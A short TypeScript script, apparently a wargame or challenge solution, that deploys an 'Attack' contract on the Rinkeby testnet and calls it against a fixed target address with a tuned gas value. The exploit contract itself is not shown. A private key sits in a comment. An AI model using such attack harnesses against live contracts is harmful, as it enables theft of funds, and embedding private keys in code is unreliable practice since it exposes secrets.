import { getDefaultProvider } from '@ethersproject/providers';
import { Wallet, utils } from 'ethers';
import { readFileSync } from 'fs-extra';
import path from 'path/posix';
import { Attack__factory } from '../types/ethers-contracts';

// import {  } from '../types/ethers-contracts';

// const provider = getDefaultProvider("http://127.0.0.1:8545");
const provider = getDefaultProvider("rinkeby");
const testPrivKey = readFileSync(path.resolve(__dirname, "./../../../.privkey")).toString().trim();
// const testPrivKey = "b883f1ad0edf4e8c7c4619b70d70ab9d02ea762a41c14c95087b943a62c9f865";
const addr = "0x40623BD54622BfA7400978B72FC5130189337E09"

function toWei(eth: number) {
  return utils.parseEther(eth.toString())
}

async function main() {
  let alice = new Wallet(testPrivKey);
  alice = alice.connect(provider);
  (new Attack__factory(alice)).deploy().then(async attack => {
    await attack.attack(addr, 50085 - 505 - 180, {
      gasLimit: 1000000
    })
  })
}

main().catch(e => {
  console.log("Error: " + e)
})
